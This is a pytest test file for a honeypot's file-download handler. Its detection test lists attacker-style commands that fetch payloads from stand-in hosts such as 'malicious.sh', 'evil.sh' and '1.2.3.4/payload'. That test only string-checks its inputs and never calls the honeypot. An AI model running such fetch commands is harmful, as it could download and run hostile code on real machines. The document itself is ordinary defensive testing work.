from unittest.mock import patch, MagicMock

import pytest

from base_honeypot import HoneypotSession
from infra.File_download_handler import FileDownloadHandler


class DummyFakeFS:
    def create_file(self, path, content):
        self.files = getattr(self, "files", {})
        self.files[path] = content


class DummySession:
    def __init__(self):
        self.files = {}


@patch("infra.File_download_handler.requests.get")
def test_wget_success(mock_get, tmp_path):
    mock_response = MagicMock()
    mock_response.text = "fake content"
    mock_response.content = b"fake content"
    mock_get.return_value = mock_response

    dummy_fs = DummyFakeFS()
    handler = FileDownloadHandler(fakefs_handler=dummy_fs, download_dir=tmp_path)
    session = {"fs": dummy_fs}

    command = "wget http://example.com/fake.txt"
    response = handler.query(command, session)

    assert dummy_fs.files["/tmp/fake.txt"] == "fake content"
    assert "Downloaded fake.txt" in response


@pytest.mark.parametrize(
    "cmd",
    [
        "cd /tmp; wget http://malicious.sh",
        "WGET http://1.2.3.4/payload",
        "curl -O http://example.com/file",
        "mkdir test && CuRL http://evil.sh",
    ],
)
def test_file_download_detection(cmd):
    session = HoneypotSession()
    detected = "wget" in cmd.lower() or "curl" in cmd.lower()
    assert detected
